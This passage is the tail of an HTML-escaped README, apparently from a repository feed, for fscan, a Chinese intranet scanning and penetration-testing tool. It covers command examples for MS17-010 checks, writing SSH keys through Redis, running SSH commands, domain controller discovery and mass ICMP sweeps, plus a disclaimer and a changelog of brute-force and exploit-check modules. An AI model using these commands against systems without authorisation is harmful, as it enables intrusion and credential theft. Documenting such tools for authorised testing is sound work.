(default 5)&#xA;  -pocpath string&#xA;        指定poc路径&#xA;  -usera string&#xA;        在原有用户字典基础上,新增新用户&#xA;  -pwda string&#xA;        在原有密码字典基础上,增加新密码&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;运行截图&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;fscan.exe -h 192.168.x.x (全功能、ms17010、读取网卡信息)&lt;/code&gt; &lt;img src=&#34;https://raw.githubusercontent.com/shadow1ng/fscan/main/image/1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/shadow1ng/fscan/main/image/4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;fscan.exe -h 192.168.x.x -rf id_rsa.pub (redis 写公钥)&lt;/code&gt; &lt;img src=&#34;https://raw.githubusercontent.com/shadow1ng/fscan/main/image/2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;fscan.exe -h 192.168.x.x -c &#34;whoami;id&#34; (ssh 命令)&lt;/code&gt; &lt;img src=&#34;https://raw.githubusercontent.com/shadow1ng/fscan/main/image/3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;fscan.exe -h 192.168.x.x -p80 -proxy http://127.0.0.1:8080 一键支持xray的poc&lt;/code&gt; &lt;img src=&#34;https://raw.githubusercontent.com/shadow1ng/fscan/main/image/2020-12-12-13-34-44.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;fscan.exe -h 192.168.x.x -p 139 (netbios探测、域控识别,下图的[+]DC代表域控)&lt;/code&gt; &lt;img src=&#34;https://raw.githubusercontent.com/shadow1ng/fscan/main/image/netbios.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;go run .\main.go -h 192.168.x.x/24 -m netbios(-m netbios时,才会显示完整的netbios信息)&lt;/code&gt; &lt;img src=&#34;https://raw.githubusercontent.com/shadow1ng/fscan/main/image/netbios1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;go run .\main.go -h 192.0.0.0/8 -m icmp(探测每个C段的网关和数个随机IP,并统计top 10 B、C段存活数量)&lt;/code&gt; &lt;img src=&#34;https://raw.githubusercontent.com/shadow1ng/fscan/main/image/live.png&#34; alt=&#34;img.png&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;参考链接&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Adminisme/ServerScan&#34;&gt;https://github.com/Adminisme/ServerScan&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://github.com/netxfly/x-crack&#34;&gt;https://github.com/netxfly/x-crack&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://github.com/hack2fun/Gscan&#34;&gt;https://github.com/hack2fun/Gscan&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://github.com/k8gege/LadonGo&#34;&gt;https://github.com/k8gege/LadonGo&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://github.com/jjf012/gopoc&#34;&gt;https://github.com/jjf012/gopoc&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;404StarLink 2.0 - Galaxy&lt;/h1&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/knownsec/404StarLink-Project/raw/master/logo.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;fscan 是 404Team &lt;a href=&#34;https://github.com/knownsec/404StarLink2.0-Galaxy&#34;&gt;星链计划2.0&lt;/a&gt; 中的一环，如果对fscan 有任何疑问又或是想要找小伙伴交流，可以参考星链计划的加群方式。&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/knownsec/404StarLink2.0-Galaxy#community&#34;&gt;https://github.com/knownsec/404StarLink2.0-Galaxy#community&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Star Chart&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://starchart.cc/shadow1ng/fscan&#34;&gt;&lt;img src=&#34;https://starchart.cc/shadow1ng/fscan.svg?sanitize=true&#34; alt=&#34;Stargazers over time&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;免责声明&lt;/h2&gt; &#xA;&lt;p&gt;本工具仅面向&lt;strong&gt;合法授权&lt;/strong&gt;的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。&lt;/p&gt; &#xA;&lt;p&gt;为避免被恶意使用，本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。&lt;/p&gt; &#xA;&lt;p&gt;在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。&lt;strong&gt;请勿对非授权目标进行扫描。&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。&lt;/p&gt; &#xA;&lt;p&gt;在安装并使用本工具前，请您&lt;strong&gt;务必审慎阅读、充分理解各条款内容&lt;/strong&gt;，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。&lt;/p&gt; &#xA;&lt;h2&gt;最近更新&lt;/h2&gt; &#xA;&lt;p&gt;[+] 2022/4/20 poc模块加入指定目录或文件 -pocpath poc路径,端口可以指定文件-portf port.txt,rdp模块加入多线程爆破demo, -br xx指定线程&lt;br&gt; [+] 2022/2/25 新增-m webonly,跳过端口扫描,直接访问http。致谢@AgeloVito&lt;br&gt; [+] 2022/1/11 新增oracle密码爆破&lt;br&gt; [+] 2022/1/7 扫ip/8时,默认会扫每个C段的网关和数个随机IP,推荐参数:-h ip/8 -m icmp.新增LiveTop功能,检测存活时,默认会输出top10的B、C段ip存活数量.&lt;br&gt; [+] 2021/12/7 新增rdp扫描,新增添加端口参数-pa 3389(会在原有端口列表基础上,新增该端口)&lt;br&gt; [+] 2021/12/1 优化xray解析模块,支持groups、新增poc,加入https判断(tls握手包),优化ip解析模块(支持所有ip/xx),增加爆破关闭参数 -nobr,添加跳过某些ip扫描功能 -hn 192.168.1.1,添加跳过某些端口扫描功能-pn 21,445,增加扫描docker未授权漏洞&lt;br&gt; [+] 2021/6/18 改善一下poc的机制，如果识别出指纹会根据指纹信息发送poc，如果没有识别到指纹才会把所有poc打一遍&lt;br&gt; [+] 2021/5/29 加入fcgi协议未授权命令执行扫描,优化poc模块,优化icmp模块,ssh模块加入私钥连接&lt;br&gt; [+] 2021/5/15 新增win03版本(删减了xray_poc模块),增加-silent 静默扫描模式,添加web指纹,修复netbios模块数组越界,添加一个CheckErrs字典,webtitle 增加gzip解码&lt;br&gt; [+] 2021/5/6 更新mod库、poc、指纹。修改线程处理机制、netbios探测、域控识别模块、webtitle编码模块等&lt;br&gt; [+] 2021/4/22 修改webtitle模块,加入gbk解码&lt;br&gt; [+] 2021/4/21 加入netbios探测、域控识别&lt;br&gt; [+] 2021/3/4 支持-u url或者-uf url.txt,对url进行批量扫描&lt;br&gt; [+] 2021/2/25 修改yaml解析模块,支持密码爆破,如tomcat弱口令。yaml中新增sets参数,类型为数组,用于存放密码,具体看tomcat-manager-week.yaml&lt;br&gt; [+] 2021/2/8 增加指纹识别功能,可识别常见CMS、框架,如致远OA、通达OA等。&lt;br&gt; [+] 2021/2/5 修改icmp发包模式,更适合大规模探测。&lt;br&gt; 修改报错提示,-debug时,如果10秒内没有新的进展,每隔10秒就会打印一下当前进度&lt;br&gt; [+] 2020/12/12 已加入yaml解析引擎,支持xray的Poc,默认使用所有Poc(已对xray的poc进行了筛选),可以使用-pocname weblogic,只使用某种或某个poc。需要go版本1.16以上,只能自行编译最新版go来进行测试&lt;br&gt; [+] 2020/12/6 优化icmp模块,新增-domain 参数(用于smb爆破模块,适用于域用户)&lt;br&gt; [+] 2020/12/03 优化ip段处理模块、icmp、端口扫描模块。新增支持192.168.1.1-192.168.255.255。&lt;br&gt; [+] 2020/11/17 增加-ping 参数,作用是存活探测模块用ping代替icmp发包。&lt;br&gt; [+] 2020/11/17 增加WebScan模块,新增shiro简单识别。https访问时,跳过证书认证。将服务模块和web模块的超时分开,增加-wt 参数(WebTimeout)。&lt;br&gt; [+] 2020/11/16 对icmp模块进行优化,增加-it 参数(IcmpThreads),默认11000,适合扫B段&lt;br&gt; [+] 2020/11/15 支持ip以文件导入,-hf ip.txt,并对去重做了处理&lt;/p&gt;</summary>
  </entry>
</feed>